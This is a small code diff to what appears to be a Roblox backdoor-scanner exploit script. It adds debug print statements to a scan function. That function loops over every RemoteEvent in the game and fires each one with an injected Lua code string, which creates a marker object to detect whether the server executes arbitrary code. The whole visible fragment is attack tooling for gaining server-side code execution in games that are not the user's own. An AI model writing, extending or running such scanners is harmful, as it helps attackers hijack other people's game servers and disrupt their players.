@@ -153,8 +153,9 @@ local function scan()
 
 	for _, testRemote in pairs(game:GetDescendants()) do
 		if testRemote.ClassName == "RemoteEvent" and BackdoorUI.attached == false then
-
+			print("scan - Checking remote " .. testRemote.Name)
 			if remoteCheck(testRemote) then
+				print("scan validated remote: " .. testRemote.Name)
 				testRemote:FireServer(
 					"i=Instance.new('StringValue',workspace) i.Name='"..
 					randID.."' i.Value='"..testRemote:GetFullName().."'"
